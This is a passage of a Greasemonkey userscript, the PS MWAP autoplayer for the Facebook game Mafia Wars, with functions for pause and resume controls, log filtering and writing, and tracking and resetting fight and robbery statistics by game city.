  // All settings are valid. Save them.
  //

  toggleSettings();
  updateLogStats();
  refreshMWAPCSS();
  sendSettings();
  logFilterOnOff(1);
}


function updateMastheadMenu() {
  var menuElt = document.getElementById('ap_menu');

  if (!menuElt) return;

  if(document.getElementById('ap_img')) {
    var menuImg = document.getElementById('ap_img');
  } else {
    var menuImg = makeElement('div', menuElt.parentNode, {'id':'ap_img', 'style':'position: absolute; top: 23px; right:135px;'});
  }

  var elt = document.getElementById('pauseButton');
  if (running) {
    destroyByID('apimg');
    makeElement('img', menuImg, {'id':'apimg','src':'http://playerscripts.co.uk/images/mwap_graphics/32_green.png'});
    if (elt) return;

    destroyByID('resumeButton');
    // Show a pause button.
    elt = makeElement('span', null, {'id':'pauseButton','style':'color:#33FF00;','title':'PS MWAP is RUNNING, click to pause ...'});
    elt.appendChild(document.createTextNode('Pause'));
    elt.addEventListener('click', pause, false);
    menuElt.insertBefore(elt, menuElt.firstChild);
  } else {
    // Remove the pause button.
    if (elt) {
      elt.parentNode.removeChild(elt);
    }
    // Show a resume button and paused image.
    elt = document.getElementById('resumeButton');
    destroyByID('apimg');
    makeElement('img', menuImg, {'id':'apimg','src':'http://playerscripts.co.uk/images/mwap_graphics/32_red.png'});
    if (elt) return;
    elt = makeElement('span', null, {'id':'resumeButton','style':'color:#FF0000;','title':'PS MWAP is PAUSED, click to resume ...'});
    elt.appendChild(document.createTextNode('Resume'));
    menuElt.insertBefore(elt, menuElt.firstChild);
    elt.addEventListener('click', unPause, false);
  }
}

//////////////
function update_nrg_stam() {
setListenStats(false);
  // Make energy icon & text clickable for mini pack.
  var nrgLinkElt = document.getElementById('mwap_nrg');
  var nrgElt = xpathFirst('./div[@class="mw_header"]//div[@class="mid_row_text energy_text_bg" and contains(text(), "ENERGY")]', statsrowElt);
  if (!nrgElt)   nrgElt = xpathFirst('.//div[@id="game_stats"]//h4[@class="energy" and contains(text(), "Energy")]', statsrowElt);
  if (!nrgElt)   nrgElt = xpathFirst('.//div[@id="game_stats"]//span[@class="stat_title" and contains(text(),"Energy")]', statsrowElt);
  if (nrgElt ) {
    if(isGMChecked('autoMission')){
       var nrgTitle = 'Spend Energy ON.  ';
        nrgElt.style.color="#33FF00"; // green
      } else {
//        if(below_energy_floor_needs_Identifying) {
//          var nrgTitle = 'Spend Energy ON, below spend floor.  ';
//          nrgElt.style.color="#FFCC00"; // orange/yellow
//        } else {
        var nrgTitle = 'Spend Energy OFF.  ';
        nrgElt.style.color="#FF0000"; // red
      }
    nrgTitle += '  NO LONGER FIRES ENERGY PACK.  ';
    nrgElt.style.textDecoration="underline";
    nrgLinkElt.title=nrgTitle;
  }
////////
  // Make stamina text & icon pointable for showing.
  var stamLinkElt = document.getElementById('mwap_stam');
  var stamElt = xpathFirst('./div[@class="mw_header"]//div[@class="mid_row_text stamina_text_bg" and contains(text(), "STAMINA")]', statsrowElt);
  if (!stamElt)
    stamElt = xpathFirst('.//div[@id="game_stats"]//h4[contains(text(), "Stamina")]', statsrowElt);
  if (!stamElt)
    stamElt = xpathFirst('.//div[@id="game_stats"]//span[@class="stat_title" and contains(text(),"Stamina")]', statsrowElt);
  if (stamElt ) {
    if(isGMChecked('staminaSpend')) {
       var stamTitle = 'Spend Stamina ON.  ';
      stamElt.style.color="#33FF00";     // green
    }  else {
       var stamTitle = 'Spend Stamina OFF.  ';
//      stamElt.style.color="#FFCC00"; // orange/yellow
      stamElt.style.color="#FF0000";     // red
}
    stamTitle += 'Minimum Stamina for auto-healing set at ' + GM_getValue('stamina_min_heal') + ' points.';
    stamElt.style.textDecoration="underline";
    stamLinkElt.title=stamTitle;
  }
  setListenStats(true);
}
////////
function pause() {
  if (GM_getValue('isRunning') === false) {
    // Must have been paused already. Make sure the log is current.
    refreshLog();
  }

  // Update the running state.
  GM_setValue('isRunning', false);
  running = false;
  sendMWValues(['isRunning']);

  // Clear all timers.
  Autoplay.clearTimeout();
  Reload.clearTimeout();

  addToLog('pause Icon', 'Autoplayer is paused. Log & stats do not track manual activity.');
  mwapOnOffMenu();
  updateMastheadMenu();
  customizeHome();
}

function unPause() {
  if (GM_getValue('isRunning') === true) {
    // Must have been resumed already. Make sure the log is current.
    refreshLog();
  }

  // Clear lists for mastered and available jobs.
  GM_setValue('masteredJobs', '({0:{},1:{},2:{},3:{},4:{},5:{}})');
  GM_setValue('availableJobs', '({0:{},1:{},2:{},3:{},4:{},5:{}})');

  // Update the running state.
  GM_setValue('isRunning', true);
  running = true;
  sendMWValues(['isRunning']);
  addToLog('play Icon', 'Autoplayer resuming.<br/>If you like PS MWAP Click Like <iframe src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fwww.facebook.com%2Fpages%2FPS-Mafia-Wars-Autoplayer%2F160393374005267&amp;layout=button_count&amp;show_faces=true&amp;width=80&amp;action=like&amp;font=arial&amp;colorscheme=light&amp;height=21" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:80px; height:21px;" allowTransparency="true"></iframe><br/>PS MWAP FB Fanpage - help us to be an authorised Zynga script.');
  mwapOnOffMenu();
  updateMastheadMenu();

  // Set up auto-reload.
  autoReload(false, 'unpause');

  // Kick off play.
  Autoplay.fx = goHome;
  Autoplay.delay = 150;
  Autoplay.start();
}

function mwapOnOffMenu() {
  var pauseLink = document.getElementById('pauseLink');
  var resumeLink = document.getElementById('resumeLink');
  if(pauseLink && resumeLink){
    if (GM_getValue('isRunning') === false) {
      pauseLink.style.display='none';
      resumeLink.style.display='block';
    } else {
      pauseLink.style.display='block';
      resumeLink.style.display='none';
    }
  }

  var mafiaLogBox = document.getElementById('mafiaLogBox');
  var mwapElt = document.getElementById('ap_mwap_pause');
  if (!mafiaLogBox || !mwapElt) return;

  if (GM_getValue('isRunning') === false) {
    destroyByID('ap_mwap_pause');
    title = 'Click to resume PS MWAP';
    var mwapElt = makeElement('div', mafiaLogBox, {'class':'mouseunderline', 'title':title,'id':'ap_mwap_pause', 'style':'position: absolute; right: 60px; top: 0px; font-weight: 600; cursor: pointer; color: rgb(255, 217, 39);'});
    mwapElt.appendChild(document.createTextNode('PS MWAP is PAUSED, click to resume'));
    mwapElt.addEventListener('click', mwapOnOff, false);
  } else {
    destroyByID('ap_mwap_pause');
    title = 'Click to pause PS MWAP';
    var mwapElt = makeElement('div', mafiaLogBox, {'class':'mouseunderline', 'title':title,'id':'ap_mwap_pause', 'style':'position: absolute; right: 60px; top: 0px; font-weight: 600; cursor: pointer; color: rgb(255, 217, 39);'});
    mwapElt.appendChild(document.createTextNode('PS MWAP is RUNNING, click to pause'));
    mwapElt.addEventListener('click', mwapOnOff, false);
  }
}

function mwapOnOff() {
  if (GM_getValue('isRunning') === true) {
    pause();
  } else {
    unPause();
  }
}

function isFamily(username, how) {
  if(how == STAMINA_HOW_FIGHT_RANDOM || how == STAMINA_HOW_FIGHT_RIVALS){
    var patterns = getSavedList('fightClanName');
    for (var i = 0, iLength=patterns.length; i < iLength; ++i) {
      var pattern = patterns[i];
      if (pattern && username.indexOf(pattern) != -1) {
        return true;
      }
    }
    return false;
  } else {
    var patterns = getSavedList('hitmanClanName');
    for (var i = 0, iLength=patterns.length; i < iLength; ++i) {
      var pattern = patterns[i];
      if (pattern && username.indexOf(pattern) != -1) {
        return true;
      }
    }
    return false;
  }

  return false;
}

// Can be enhanced by regular expressions but will "regular" folks get it?
function isLoggable(line) {
  // Do not filter logs if in DEBUG mode OR
  // if log filtering is disabled
  var filterOpt = parseInt(GM_getValue('filterOpt', 0));
  if (!line || debug || !isGMChecked('filterLog') || isNaN(filterOpt))
    return true;

  if (line.indexOf('Log filtering') != -1 || line.indexOf('"good">Patterns ') != -1) return true;

  var logPatterns = getSavedList(filterOpt == 0 ? 'filterPass' : 'filterFail');

  // Log if line ONLY contains any pattern from list
  for (var i = 0, iLength=logPatterns.length; i < iLength; ++i) {
    var pattern = logPatterns[i];
    if (pattern && line.indexOf(pattern) != -1) {
      return (filterOpt == 0);
    }
  }

  return (filterOpt == 1);
}
////  only attempt to display line in log if 'log filtering on' &&
////  must have a 'match word' in accept pattern found. IE: mission to show mission debugging
function Diagnose(Diagnose_msg){
  if( (!isGMChecked('filterLog') )  ) return;  //newchange
  addToLog('info Icon','<span style="color:#04B4AE;";> ' + Diagnose_msg + ' <strong></strong>.</span>');
}
////
function addToLog(icon, line) {
  if (!debug && !isGMChecked('autoLog')) {
    // Logging is turned off.
    return;
  }

  // Do not log anything if log filter condition is met
  if (!isLoggable(line)) {
    return;
  }

  // Create a datestamp, formatted for the log.
  var currentTime = new Date();
  var m_names = new Array('Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec');
  var timestampdate = m_names[currentTime.getMonth()] + ' ' + currentTime.getDate();

  // Create a timestamp, formatted for the log.
  var timestamptime =
    (currentTime.getHours() < 10 ? 0 : '') + currentTime.getHours() + ':' +
    (currentTime.getMinutes() < 10 ? 0 : '') + currentTime.getMinutes() + ':' +
    (currentTime.getSeconds() < 10 ? 0 : '') + currentTime.getSeconds() + '&nbsp;';

  // Get a log box to work with.
  var logBox = document.getElementById('logBox');
  if (!logBox) {
    if (!addToLog.logBox) {
      // There's no log box, so create one.
      addToLog.logBox = document.createElement('div');
      addToLog.logBox.innerHTML = GM_getValue('itemLog', '');
    }
    logBox = addToLog.logBox;
  }
  var logLen = logBox.childNodes.length;

  // Determine whether the new line repeats the most recent one.
  var repeatCount;
  if (logLen) {
    var elt = logBox.firstChild.childNodes[1];
    if (elt && elt.innerHTML) {
      var m = elt.innerHTML.untag().match(/^(.+?)(?:\s\((\d+) times\))?$/);
      if (m && m[1] == String(line).untag()) {
        if (m[2]) {
          repeatCount = parseInt(m[2]) + 1;
        } else {
          repeatCount = 2;
        }
        line += ' (' + repeatCount + ' times)';
      }
    }
  }

  // Create the new log entry.
  var lineToAdd = document.createElement('div');
  lineToAdd.className = 'logEvent ' + icon;
  lineToAdd.innerHTML = '<div class="eventTime">' + timestampdate + ' - ' +
                        timestamptime + '</div><div class="eventBody">' +
                        line + '</div><div class="clear"></div>';

  // Put it in the log box.
  if (repeatCount) {
    logBox.replaceChild(lineToAdd, logBox.firstChild);
  } else {
    logBox.insertBefore(lineToAdd, logBox.firstChild);

    // If the log is too large, trim it down.
    var logMax = parseInt(GM_getValue('autoLogLength', 300));
    //hard-coded log length maximum of 1000 lines
    if(logMax > 1000 || debug) logMax = 1000;
    if (logMax > 0) {
      while (logLen-- > logMax) {
        logBox.removeChild(logBox.lastChild);
      }
    }
  }

  // Save the log.
  GM_setValue('itemLog', logBox.innerHTML);
}

function updateLogStats() {
  var fightCount = document.getElementById('fightCount');
  if (fightCount) {
    fightCount.firstChild.nodeValue = makeCommaValue(GM_getValue('fightWinCountInt', 0) + GM_getValue('fightLossCountInt', 0));
    document.getElementById('fightWinCount').firstChild.nodeValue = makeCommaValue(GM_getValue('fightWinCountInt', 0));
    var fightWinPct = (GM_getValue('fightWinCountInt', 0)/(GM_getValue('fightWinCountInt', 0) + GM_getValue('fightLossCountInt', 0)) * 100).toFixed(1);
      document.getElementById('fightWinPct').firstChild.nodeValue =  (isNaN(fightWinPct)) ? '0.0%' : fightWinPct + '%';
    document.getElementById('fightLossCount').firstChild.nodeValue = makeCommaValue(GM_getValue('fightLossCountInt', 0));
    var fightLossPct = (GM_getValue('fightLossCountInt', 0)/(GM_getValue('fightWinCountInt', 0) + GM_getValue('fightLossCountInt', 0)) * 100).toFixed(1)
      document.getElementById('fightLossPct').firstChild.nodeValue =  (isNaN(fightLossPct)) ? '0.0%' : fightLossPct + '%';
  }

  var passivefightCount = document.getElementById('passivefightCount');
  if (passivefightCount) {
    passivefightCount.firstChild.nodeValue = makeCommaValue(GM_getValue('passivefightWinCountInt', 0) + GM_getValue('passivefightLossCountInt', 0));
    document.getElementById('passivefightWinCount').firstChild.nodeValue = makeCommaValue(GM_getValue('passivefightWinCountInt', 0));
    var fightWinPct = (GM_getValue('passivefightWinCountInt', 0)/(GM_getValue('passivefightWinCountInt', 0) + GM_getValue('passivefightLossCountInt', 0)) * 100).toFixed(1);
    document.getElementById('passivefightWinPct').firstChild.nodeValue =  (isNaN(fightWinPct)) ? '0.0%' : fightWinPct + '%';
    document.getElementById('passivefightLossCount').firstChild.nodeValue = makeCommaValue(GM_getValue('passivefightLossCountInt', 0));
    var fightLossPct = (GM_getValue('passivefightLossCountInt', 0)/(GM_getValue('passivefightWinCountInt', 0) + GM_getValue('passivefightLossCountInt', 0)) * 100).toFixed(1)
    document.getElementById('passivefightLossPct').firstChild.nodeValue =  (isNaN(fightLossPct)) ? '0.0%' : fightLossPct + '%';
  }

  var passiveWinDollars = document.getElementById('totalPassiveWinDollars');
  if (passiveWinDollars) {
    var winDollars = parseInt(GM_getValue('passivefightWin$NY', 0)) + parseInt(GM_getValue('passivefightWin$Cuba', 0)) + parseInt(GM_getValue('passivefightWin$Moscow', 0)) + parseInt(GM_getValue('passivefightWin$Bangkok', 0)) + parseInt(GM_getValue('passivefightWin$Vegas', 0)) + parseInt(GM_getValue('passivefightWin$Italy', 0));
    var lossDollars = parseInt(GM_getValue('passivefightLoss$NY', 0)) + parseInt(GM_getValue('passivefightLoss$Cuba', 0)) + parseInt(GM_getValue('passivefightLoss$Moscow', 0)) + parseInt(GM_getValue('passivefightLoss$Bangkok', 0)) + parseInt(GM_getValue('passivefightLoss$Vegas', 0)) + parseInt(GM_getValue('passivefightLoss$Italy', 0));
    var titlePassiveWinDollars = '$' + makeCommaValue(GM_getValue('passivefightWin$NY', 0)) + ' | C$' + makeCommaValue(GM_getValue('passivefightWin$Cuba', 0)) + ' | M$' + makeCommaValue(GM_getValue('passivefightWin$Moscow', 0)) + ' | B$' + makeCommaValue(GM_getValue('passivefightWin$Bangkok', 0)) + ' | V$' + makeCommaValue(GM_getValue('passivefightWin$Vegas', 0)) + ' | L$' + makeCommaValue(GM_getValue('passivefightWin$Italy', 0));
    var titlePassiveLossDollars = '$' + makeCommaValue(GM_getValue('passivefightLoss$NY', 0)) + ' | C$' + makeCommaValue(GM_getValue('passivefightLoss$Cuba', 0)) + ' | M$' + makeCommaValue(GM_getValue('passivefightLoss$Moscow', 0)) + ' | B$' + makeCommaValue(GM_getValue('passivefightLoss$Bangkok', 0)) + ' | V$' + makeCommaValue(GM_getValue('passivefightLoss$Vegas', 0)) + ' | L$' + makeCommaValue(GM_getValue('passivefightLoss$Italy', 0));
    passiveWinDollars.firstChild.nodeValue = getDollarsUnit(winDollars);
    document.getElementById('totalPassiveLossDollars').firstChild.nodeValue = getDollarsUnit(lossDollars);
    document.getElementById('totalPassiveWinDollars').setAttribute('title', titlePassiveWinDollars);
    document.getElementById('totalPassiveLossDollars').setAttribute('title', titlePassiveLossDollars);
  }

  var whackedCount = document.getElementById('whackedCount');
  if (whackedCount) {
    document.getElementById('whackedCount').firstChild.nodeValue =  GM_getValue('whackedCount', 0);
  }

  var snuffCount = document.getElementById('snuffCount');
  if (snuffCount) {
    document.getElementById('snuffCount').firstChild.nodeValue =  GM_getValue('snuffCount', 0);
  }

  var passiveTotalExp = document.getElementById('passivetotalExp');
  if (passiveTotalExp) {
    passiveTotalExp.firstChild.nodeValue = makeCommaValue(GM_getValue('passivetotalFightExpInt', 0) + GM_getValue('passivetotalJobExpInt', 0));
    document.getElementById('passivetotalFightExp').firstChild.nodeValue = makeCommaValue(GM_getValue('passivetotalFightExpInt', 0));
    document.getElementById('passivetotalJobExp').firstChild.nodeValue = makeCommaValue(GM_getValue('passivetotalJobExpInt', 0));
  }

  var hitmanCount = document.getElementById('hitmanCount');
  if (hitmanCount) {
    document.getElementById('hitmanCount').firstChild.nodeValue = makeCommaValue(parseInt(GM_getValue('hitmanWinCountInt', 0)) + parseInt(GM_getValue('hitmanLossCountInt', 0)));
    document.getElementById('hitmanWinCount').firstChild.nodeValue = makeCommaValue(GM_getValue('hitmanWinCountInt', 0));
    var hitmanWinPct = (GM_getValue('hitmanWinCountInt', 0)/(GM_getValue('hitmanWinCountInt', 0) + GM_getValue('hitmanLossCountInt', 0)) * 100).toFixed(1);
      document.getElementById('hitmanWinPct').firstChild.nodeValue =  (isNaN(hitmanWinPct)) ? '0.0%' : hitmanWinPct + '%';
    document.getElementById('hitmanLossCount').firstChild.nodeValue = makeCommaValue(GM_getValue('hitmanLossCountInt', 0));
    var hitmanLossPct = (GM_getValue('hitmanLossCountInt', 0)/(GM_getValue('hitmanWinCountInt', 0) + GM_getValue('hitmanLossCountInt', 0)) * 100).toFixed(1);
      document.getElementById('hitmanLossPct').firstChild.nodeValue =  (isNaN(hitmanLossPct)) ? '0.0%' : hitmanLossPct + '%';
  }

  var robCount = document.getElementById('robCount');
  if (robCount) {
    document.getElementById('robCount').firstChild.nodeValue = makeCommaValue(parseInt(GM_getValue('robSuccessCountInt', 0)) + parseInt(GM_getValue('robFailedCountInt', 0)));
    document.getElementById('robWinCount').firstChild.nodeValue = makeCommaValue(GM_getValue('robSuccessCountInt', 0));
    var robWinPct = (GM_getValue('robSuccessCountInt', 0)/(GM_getValue('robSuccessCountInt', 0) + GM_getValue('robFailedCountInt', 0)) * 100).toFixed(1);
      document.getElementById('robWinPct').firstChild.nodeValue =  (isNaN(robWinPct)) ? '0.0%' : robWinPct + '%';
    document.getElementById('robLossCount').firstChild.nodeValue = makeCommaValue(GM_getValue('robFailedCountInt', 0));
    var robLossPct = (GM_getValue('robFailedCountInt', 0)/(GM_getValue('robSuccessCountInt', 0) + GM_getValue('robFailedCountInt', 0)) * 100).toFixed(1);
      document.getElementById('robLossPct').firstChild.nodeValue =  (isNaN(robLossPct)) ? '0.0%' : robLossPct + '%';
  }

  var totalWinDollars = document.getElementById('totalWinDollars');
  // if one is there, they all should be there
  if (totalWinDollars) {
    totalWinDollars.firstChild.nodeValue = getDollarsUnit(parseInt(GM_getValue('totalWinDollarsInt', 0)));
    document.getElementById('totalLossDollars').firstChild.nodeValue = getDollarsUnit(parseInt(GM_getValue('totalLossDollarsInt', 0)));
    var titleWinDollars = '$' + makeCommaValue(GM_getValue('fightWin$NY', 0)) + ' | C$' + makeCommaValue(GM_getValue('fightWin$Cuba', 0)) + ' | M$' + makeCommaValue(GM_getValue('fightWin$Moscow', 0)) + ' | B$' + makeCommaValue(GM_getValue('fightWin$Bangkok', 0)) + ' | V$' + makeCommaValue(GM_getValue('fightWin$Vegas', 0))  + ' | L$' + makeCommaValue(GM_getValue('fightWin$Italy', 0));
    var titleLossDollars = '$' + makeCommaValue(GM_getValue('fightLoss$NY', 0)) + ' | C$' + makeCommaValue(GM_getValue('fightLoss$Cuba', 0)) + ' | M$' + makeCommaValue(GM_getValue('fightLoss$Moscow', 0)) + ' | B$' + makeCommaValue(GM_getValue('fightLoss$Bangkok', 0)) + ' | V$' + makeCommaValue(GM_getValue('fightLoss$Vegas', 0))  + ' | L$' + makeCommaValue(GM_getValue('fightLoss$Italy', 0));
    document.getElementById('totalWinDollars').setAttribute('title', titleWinDollars);
    document.getElementById('totalLossDollars').setAttribute('title', titleLossDollars);

    document.getElementById('totalExp').firstChild.nodeValue = makeCommaValue(GM_getValue('totalExpInt', 0));
    //FIXME: These values currently only get refreshed when stamina is spent,
    //       which isn't often enough. Perhaps other stats that only need to
    //       be refreshed after stamina is spent would be more useful anyway?
    //       And the xps to next level stat already appears in the main window.
    var rate = getStaminaGainRate();
    document.getElementById('expRate').firstChild.nodeValue = rate.toFixed(2);
    document.getElementById('expToNext').firstChild.nodeValue = makeCommaValue(ptsToNextLevel);
    document.getElementById('stamToNext').firstChild.nodeValue = rate? (ptsToNextLevel / rate).toFixed(0): 'n/a';
  }
}

function logFilterOnOff(toggle) {
  // Toggle logFilter flag
  var filter;
  if(toggle!=1) filter = toggleCheckElt('filterLog');
  else filter = isGMChecked('filterLog');

  var filterOnLink = document.getElementById('filterOn');
  var filterOffLink = document.getElementById('filterOff');

  if(filterOnLink && filterOffLink){
    if (filter) {
      filterOnLink.style.display='block';
      filterOffLink.style.display='none';
    } else {
      filterOnLink.style.display='none';
      filterOffLink.style.display='block';
    }

  }

  if(toggle!=1){
  // Log/Show Message
    var accept = GM_getValue('filterOpt') != 1;
    var patterns = getSavedList(accept ? 'filterPass' : 'filterFail');
    var msgLog = filter ? 'Log filtering disabled. <span class="good">Patterns ' + (accept ? 'accepted' : 'rejected') +
                          '</span>:<br>' + patterns.join(', ') : 'Log filtering disabled.';
    addToLog('info Icon', msgLog);
    if (GM_getValue('logOpen') != 'open') {
      alert(msgLog);
    }
  }
}

function debugOnOff() {
  var debugOnLink = document.getElementById('debugOn');
  var debugOffLink = document.getElementById('debugOff');

  if(debugOnLink && debugOffLink){
    if (isGMChecked('enableDebug')) {
      addToLog('info Icon', 'Debug logging disabled.<br>[code]');
      GM_setValue('enableDebug', 0);
      debug = false;
      if (GM_getValue('logOpen') != 'open') {
        alert('Debug logging disabled.');
      } else {

        debugOnLink.style.display='none';
        debugOffLink.style.display='block';
      }
    } else {
      GM_setValue('enableDebug', 'checked');
      debug = true;
      showMafiaLogBox();
      addToLog('info Icon', '[/code]<br>Debug logging enabled.');
      debugOnLink.style.display='block';
      debugOffLink.style.display='none';
      debugDumpSettings();
    }
  }
}

function DEBUG(line, level) {
  if (debug) {
    addToLog('info Icon', line);
  } else if (isGMChecked('enableDebug')) {
  }
  if(SCRIPT.UseDebugConsole) {
    level = (level == null) ? 0 : level;
    GM_log(line, level);
  }
}

function refreshLog() {
  var logBox = document.getElementById('logBox');
  if (logBox) {
    logBox.innerHTML = GM_getValue('itemLog', '');
  }
}

function clearLog() {
  GM_setValue('itemLog', '');
  var logBox = document.getElementById('logBox');
  logBox.innerHTML = '';
}

function clearStats() {
  //reset log statistics
  GM_setValue('fightWinCountInt', 0);
  GM_setValue('fightLossCountInt', 0);

  GM_setValue('passivefightWinCountInt', 0);
  GM_setValue('passivefightLossCountInt', 0);
  GM_setValue('passivetotalJobExpInt', 0);
  GM_setValue('passivetotalFightExpInt', 0);
  GM_setValue('passivefightWin$NY', '0');
  GM_setValue('passivefightWin$Cuba', '0');
  GM_setValue('passivefightWin$Moscow', '0');
  GM_setValue('passivefightWin$Bangkok', '0');
  GM_setValue('passivefightWin$Vegas', '0');
  GM_setValue('passivefightWin$Italy', '0');
  GM_setValue('passivefightLoss$NY', '0');
  GM_setValue('passivefightLoss$Cuba', '0');
  GM_setValue('passivefightLoss$Moscow', '0');
  GM_setValue('passivefightLoss$Bangkok', '0');
  GM_setValue('passivefightLoss$Vegas', '0');
  GM_setValue('passivefightLoss$Italy', '0');

  GM_setValue('snuffCount', 0);
  GM_setValue('whackedCount', 0);

  GM_setValue('robSuccessCountInt', 0);
  GM_setValue('robFailedCountInt', 0);
  GM_setValue('hitmanWinCountInt',0);
  GM_setValue('hitmanWinDollarsInt','0');
  GM_setValue('hitmanLossCountInt',0);
  GM_setValue('hitmanLossDollarsInt','0');

  GM_setValue('totalExpInt', 0);
  GM_setValue('totalRobStamInt', 0);
  GM_setValue('totalWinDollarsInt', '0');
  GM_setValue('totalLossDollarsInt', '0');

  GM_setValue('lastHitXp', 0);
  GM_setValue('totalHits', 0);
  GM_setValue('totalXp', 0);
  GM_setValue('currentHitXp', 0);
  GM_setValue('currentHitDollars','0');

  //ATK
  //New tracking stats for NY
  GM_setValue('fightExpNY', 0);          //Number of exper. points earned from fights in NY
  GM_setValue('fightWinsNY', 0);         //Count of fights won in NY
  GM_setValue('fightWin$NY', '0');       //$ won from fights in NY
  GM_setValue('fightLossesNY', 0);       //Count of fights lost in NY
  GM_setValue('fightLoss$NY', '0');      //$ lost from fights in NY
  GM_setValue('fightLossBGCHNY', 0);     //NY Bodyguard Critical Hit losses
  GM_setValue('fightLossBGCH$NY', '0');  //NY$ lost by Bodyguard Critical Hit
  GM_setValue('fightLossCHNY', 0);       //NY Critical Hit fight losses
  GM_setValue('fightLossCH$NY', '0');    //$ lost from Critical Hit in NY fights
  GM_setValue('fightLossStrongNY', 0);   //Too Strong loss type count from NY fights
  GM_setValue('fightLossStrong$NY', '0');//$ lost from Too Strong in NY fights
  //New tracking stats for Cuba
  GM_setValue('fightExpCuba', 0);        //Number of exper. points earned from fights in Cuba
  GM_setValue('fightWinsCuba', 0);       //Count of fights won in Cuba
  GM_setValue('fightWin$Cuba', '0');     //Cuban pesos won from fights
  GM_setValue('fightLossesCuba', 0);     //Count of fights lost in Cuba
  GM_setValue('fightLoss$Cuba', '0');    //Cuban pesos lost from fights
  GM_setValue('fightLossBGCHCuba', 0);   //Bodyguard Critical Hit loss type count from Cuba fights
  GM_setValue('fightLossBGCH$Cuba', '0');//$ lost from Bodyguard Critical Hit in Cuba fights
  GM_setValue('fightLossCHCuba', 0);     //Critical Hit loss type count from Cuba fights
  GM_setValue('fightLossCH$Cuba', '0');  //$ lost from Critical Hit in Cuba fights
  GM_setValue('fightLossStrongCuba', 0); //Too Strong loss type count from Cuba fights
  GM_setValue('fightLossStrong$Cuba', '0');//$ lost from Too Strong in Cuba fights
  //New tracking stats for Moscow
  GM_setValue('fightExpMoscow', 0);        //Number of exper. points earned from fights in Moscow
  GM_setValue('fightWinsMoscow', 0);       //Count of fights won in Moscow
  GM_setValue('fightWin$Moscow', '0');     //Moscown pesos won from fights
  GM_setValue('fightLossesMoscow', 0);     //Count of fights lost in Moscow
  GM_setValue('fightLoss$Moscow', '0');    //Moscown pesos lost from fights
  GM_setValue('fightLossBGCHMoscow', 0);   //Bodyguard Critical Hit loss type count from Moscow fights
  GM_setValue('fightLossBGCH$Moscow', '0');//$ lost from Bodyguard Critical Hit in Moscow fights
  GM_setValue('fightLossCHMoscow', 0);     //Critical Hit loss type count from Moscow fights
  GM_setValue('fightLossCH$Moscow', '0');  //$ lost from Critical Hit in Moscow fights
  GM_setValue('fightLossStrongMoscow', 0); //Too Strong loss type count from Moscow fights
  GM_setValue('fightLossStrong$Moscow', '0');//$ lost from Too Strong in Moscow fights
  //New tracking stats for Bangkok
  GM_setValue('fightExpBangkok', 0);        //Number of exper. points earned from fights in Bangkok
  GM_setValue('fightWinsBangkok', 0);       //Count of fights won in Bangkok
  GM_setValue('fightWin$Bangkok', '0');     //Bangkok pesos won from fights
  GM_setValue('fightLossesBangkok', 0);     //Count of fights lost in Bangkok
  GM_setValue('fightLoss$Bangkok', '0');    //Bangkok pesos lost from fights
  GM_setValue('fightLossBGCHBangkok', 0);   //Bodyguard Critical Hit loss type count from Bangkok fights
  GM_setValue('fightLossBGCH$Bangkok', '0');//$ lost from Bodyguard Critical Hit in Bangkok fights
  GM_setValue('fightLossCHBangkok', 0);     //Critical Hit loss type count from Bangkok fights
  GM_setValue('fightLossCH$Bangkok', '0');  //$ lost from Critical Hit in Bangkok fights
  GM_setValue('fightLossStrongBangkok', 0); //Too Strong loss type count from Bangkok fights
  GM_setValue('fightLossStrong$Bangkok', '0');//$ lost from Too Strong in Bangkok fights
  //New tracking stats for Las Vegas
  GM_setValue('fightExpVegas', 0);        //Number of exper. points earned from fights in Bangkok
  GM_setValue('fightWinsVegas', 0);       //Count of fights won in Vegas
  GM_setValue('fightWin$Vegas', '0');     //Vegas $ won from fights
  GM_setValue('fightLossesVegas', 0);     //Count of fights lost in Vegas
  GM_setValue('fightLoss$Vegas', '0');    //Vegas $ lost from fights
  GM_setValue('fightLossBGCHVegas', 0);   //Bodyguard Critical Hit loss type count from Vegas fights
  GM_setValue('fightLossBGCH$Vegas', '0');//$ lost from Bodyguard Critical Hit in Vegas fights
  GM_setValue('fightLossCHVegas', 0);     //Critical Hit loss type count from Vegas fights
  GM_setValue('fightLossCH$Vegas', '0');  //$ lost from Critical Hit in Vegas fights
  GM_setValue('fightLossStrongVegas', 0); //Too Strong loss type count from Vegas fights
  GM_setValue('fightLossStrong$Vegas', '0');//$ lost from Too Strong in Vegas fights
  //New tracking stats for Italy
  GM_setValue('fightExpItaly', 0);        //Number of exper. points earned from fights in Bangkok
  GM_setValue('fightWinsItaly', 0);       //Count of fights won in Italy
  GM_setValue('fightWin$Italy', '0');     //Italy $ won from fights
  GM_setValue('fightLossesItaly', 0);     //Count of fights lost in Italy
  GM_setValue('fightLoss$Italy', '0');    //Italy $ lost from fights
  GM_setValue('fightLossBGCHItaly', 0);   //Bodyguard Critical Hit loss type count from Italy fights
  GM_setValue('fightLossBGCH$Italy', '0');//$ lost from Bodyguard Critical Hit in Italy fights
  GM_setValue('fightLossCHItaly', 0);     //Critical Hit loss type count from Italy fights
  GM_setValue('fightLossCH$Italy', '0');  //$ lost from Critical Hit in Italy fights
  GM_setValue('fightLossStrongItaly', 0); //Too Strong loss type count from Italy fights
  GM_setValue('fightLossStrong$Italy', '0');//$ lost from Too Strong in Italy fights

  updateLogStats();
}

function showPrimaryStats() {
  var passiveElt = document.getElementById('statPassive');
  var primaryElt = document.getElementById('statPrimary');
  var primaryBtnElt = document.getElementById('btnPrimaryStat');
  var passiveBtnElt = document.getElementById('btnPassiveStat');
  if (passiveElt && primaryElt) {
    passiveElt.style.display = 'none';
    primaryElt.style.display = 'block';
    passiveBtnElt.style.color = 'rgb(0, 128, 0)';
    primaryBtnElt.style.color = 'rgb(0, 255, 0)';
  }
}

function showPassiveStats() {
  var passiveElt = document.getElementById('statPassive');
  var primaryElt = document.getElementById('statPrimary');
  var primaryBtnElt = document.getElementById('btnPrimaryStat');
  var passiveBtnElt = document.getElementById('btnPassiveStat');
  if (passiveElt && primaryElt) {
    primaryElt.style.display = 'none';
    passiveElt.style.display = 'block';
    primaryBtnElt.style.color = 'rgb(0, 128, 0)';
    passiveBtnElt.style.color = 'rgb(0, 255, 0)';
  }
}

function createLogBox() {
  if (document.getElementById('mafiaLogBox')) return;

  // This creates the log box
